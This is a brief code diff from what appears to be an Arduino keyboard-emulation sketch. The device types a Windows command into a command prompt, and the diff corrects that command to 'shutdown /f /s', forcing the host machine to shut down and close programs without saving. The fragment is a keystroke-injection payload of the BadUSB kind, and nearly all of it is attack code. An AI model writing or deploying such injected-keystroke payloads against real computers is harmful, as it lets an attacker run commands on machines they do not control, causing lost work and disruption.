@@ -43,7 +43,7 @@ void loop()
         delay(1000);
     
         // commond to be entered
-        char* cmd = "shutdown /f";
+        char* cmd = "shutdown /f /s";
         // print command to cmd
         Keyboard.print(cmd);
         delay(50);
